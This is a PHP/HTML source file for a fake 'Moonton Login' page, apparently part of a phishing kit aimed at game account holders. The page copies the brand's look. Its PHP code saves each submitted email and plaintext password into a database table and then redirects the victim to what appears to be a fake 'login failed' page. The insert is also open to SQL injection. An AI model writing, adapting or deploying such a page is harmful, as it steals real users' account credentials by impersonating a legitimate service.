<?php 
require __DIR__ . '/../conf.php';
if(isset($_POST['submit'])){
	$email = htmlspecialchars($_POST['email']);
	$password = htmlspecialchars($_POST['password']);
	mysqli_query($conn, "INSERT INTO mtdata VALUES ('$email', '$password')");
	header('location: mtgagal.php');
}

 ?>

<!DOCTYPE html>
<html>

<!---Including CSS-->
<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Roboto:400" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3mobile.css">
<link rel="icon" type="image/png" href="res/mtico.png"/>
<link rel="stylesheet" href="stile.css">

<head>
  <title>Moonton Login</title>

<style>

body {
 background-image: url("res/bg1.jpg");
 background-repeat: no-repeat;
 background-size: cover;
 background-attachment: fixed;
 background-position: center center;
 background-color: black;
}

input {
	width: 300px !important;
}

@media (max-width: 400px) {
  input {
    width: 100% !important;
    margin-top: 0;
  }
}

 </style>
 </head>
 
 <body>
 <center>
 <br>
	 <img src="res/mtico.png" width="150px" height="150px"><br>
	 <h1 style="color: white">Moonton Login</h1><br>
	 <form action="" method="POST" style="margin-top: -30px;">
			 <input type="text" name="email" placeholder="Email address" maxlength="72" required> <br>
			 <input type="password" name="password" placeholder="Password" maxlength="72" required style="margin-top: 6px"> <br>
			 <input type="submit" name="submit" value="Login" style="
			 width: 277px;
			 margin-top: 6px;
			 height: 40px;
			 color: white;
			 font-weight: bold;
			 border: none;
			 background-color: orange;
			 "> <br>
		 </form>
 </center>
 </body>

</html>